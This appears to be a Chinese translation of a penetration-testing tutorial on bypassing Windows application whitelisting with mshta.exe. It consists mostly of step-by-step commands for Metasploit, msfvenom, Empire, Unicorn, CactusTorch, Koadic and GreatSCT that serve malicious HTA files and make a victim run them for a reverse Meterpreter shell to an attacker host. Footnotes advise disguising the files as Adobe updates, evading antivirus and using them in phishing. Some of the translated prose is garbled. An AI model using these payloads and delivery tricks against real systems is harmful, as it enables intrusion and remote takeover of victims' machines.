## 使用mshta.exe绕过应用程序白名单（多种方法）[^1]

### **介绍** [^2]

### **重要性** [^3]

### **方法**

- Metasploit [^4]

  - ```bash
    use exploit/windows/misc/hta_server
    msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
    msf exploit(windows/misc/hta_server) > exploit
    sessions   #查看建立的会话
    ```

  - `mshta.exe http://192.168.1.109:8080/pKz4Kk059Nq9.hta` [^5]

- Setoolkit

  - ```bash
    setoolkit
    1
    2
    8
    2
    [LHOST]：192.168.1.110
    3
    # 键入3后按Enter键，进程将启动，您将拥有处理程序（多/处理程序）。现在将您的恶意IP转换为有点链接，当您与他们共享此链接时，这将显示给受害者更真实。
    # 当受害者浏览恶意链接时，该文件将被保存并在被保存后自动执行到受害者的PC中。此时就会建立一个会话
    ```

- Magic unicorn [^6]

  - ```bash
    python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.109 1234 hta
    cd hta_attack/
    ls Launcher.hta
    python -m SimpleHTTPServer 80
    mshta.exe http://192.168.1.109/Launcher.hta #目标主机cmd执行
    sessions
    ```

- Msfvenom

  - ```bash
    msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f hta-psh > shell.hta
    python -m SimpleHTTPServer 80
    mshta.exe http:192.168.1.109/shell.hta #目标主机cmd执行
    ```

  - ```bash
    use exploit/multi/handler
    msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
    msf exploit(multi/handler) > set lhost 192.168.1.109
    msf exploit(multi/handler) > set lport 1234
    msf exploit(multi/handler) > exploit
    sysinfo
    ```

- Empire

  - ```bash
    ./reset.sh
    listeners
    uselistener http
    set Host http://192.168.1.109
    set port 80
    execute
    back
    usestager windows/hta
    set Listener http
    set OutFile /root/Desktop/1.hta
    execute
    mshta.exe http://192.168.1.109:8080/1.hta #目标主机cmd执行
    ```

- CactusTorch [^7]

  - ```bash
    msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f raw > 1.bin
    cat 1.bin | base64 -w 0 #进行base64加密
    ls -la
    ./CACTUSTORCH.hta
    [code]="粘贴base64加密过得shellcode"
    mshta.exe http://192.168.1.109/CACTUSTORCH.hta #目标主机cmd执行
    ```

  - ```bash
    use exploit/multi/handler
    msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
    msf exploit(multi/handler) > set lhost 192.168.1.109
    msf exploit(multi/handler) > set lport 1234
    msf exploit(multi/handler) > exploit
    ```

- Koadic [^8]

  - ```bash
    info
    set rsvhost 192.168.1.109
    set endpoint sales
    run
    mshta.exe http://192.168.1.107:9999/sales #目标主机cmd执行
    zombies # 查看建立的会话
    zombies 0 
    ```

- Great SCT [^9]

  - ```bash
    use Bypass
    list
    use mshta/shellcode_inject/base64_migrate.py
    generate
    1
    [enter]:windows/meterpreter/reverse_tcp
    [lhost]:192.168.1.109
    [lport]:4321
    (name):payload
    # 输出两个文件：payload.hta; payload.rc
    python -m SimpleHTTPServer 80
    mshta.exe http://192.168.1.109/payload.hta #目标主机cmd执行
    msfconsole -r /usr/share/greatsct-output/handlers/payload.rc
    ```

### 结论 [^10]

[原文](https://www.hackingarticles.in/bypass-application-whitelisting-using-mshta-exe-multiple-methods/)

---

[^1]: HTA是一种有用且重要的攻击，因为它可以绕过应用程序白名单。即如何**使用mshta.exe绕过Applocker策略**
[^2]: 很长一段时间以来，HTA文件一直被网络攻击或恶意软件的下载者用作驱动程序的一部分。这包括做一些基本的工作，比如转移移动客户端，以及教育网站，但是，没有移动支持。HTA文件在网络安全领域内广为人知，从红组和蓝组的角度来看，它是绕过应用程序白名单的“复古”方法之一。mshta.exe运行Microsoft HTML应用程序主机，该主机是负责运行HTA（HTML应用程序）文件的Windows OS实用程序。我们可以运行javascript或Visual的HTML文件。您可以使用Microsoft MSHTA.exe工具解释这些文件。
[^3]: 最后，利用htaccess文件或其他策略转移基于浏览器的排序将有助于提高胜利率。利用HTA文件进行基于网络的攻击。HTA文件中有很多适应性; 你将有效地使它看起来像一个Adobe更新程序，每个用户的安全记录，以及许多其他的东西。此外，通过HTTPS使HTA文件限制不使用几种SSL拦截/终止的公司的发现率也是有用的。HTA记录有助于绕过防病毒，因为它们仍未被很好地识别。最后但并非最不重要的是，HTA也可用于网络钓鱼，取代旧的Java Applet攻击。
[^4]: Metasploit包含“HTA Web Server”模块，可生成恶意hta文件。此模块托管HTML应用程序（HTA），打开时将通过Powershell运行有效负载。当用户导航到HTA文件时，在执行有效负载之前，IE将提示他们两次
[^5]: 一旦漏洞被执行，它将为您提供扩展名为`.hta`的URL链接。同时，Metasploit将启动允许您共享文件的服务器。此链接您还必须在受害者的PC上运行
[^6]: 它是一个用户友好的工具，它允许我们通过将shellcode直接注入内存来执行HTA攻击。[项目地址](https://github.com/trustedsec/unicorn)
[^7]: [项目地址](https://github.com/mdsecactivebreach/CACTUSTORCH) Cactustorch is a framework for javascript and VBScript shellcode launcher.
[^8]: Koadic, or COM Command & Control, is a Windows post-exploitation rootkit similar to other penetration testing tools such as Meterpreter and Powershell Empire.[more link](https://www.hackingarticles.in/koadic-com-command-control-framework)
[^9]: GreatSCT is a tool that allows you to use Metasploit exploits and lets it bypass most anti-viruses. [项目地址](https://github.com/GreatSCT/GreatSCT)
[^10]: So basically, this type of attack is a simple HTA attack provide full access to the remote attacker. An attacker can create a malicious application for the Windows operating system using web technologies to clone a site. In a nutshell, it performs PowerShell injection through HTA files which can be used for Windows-based PowerShell exploitation through the browser. And the above are the methods used for the attack. As they say, if one door closes another opens; therefore when the same attack is learned through different ways are often convenient.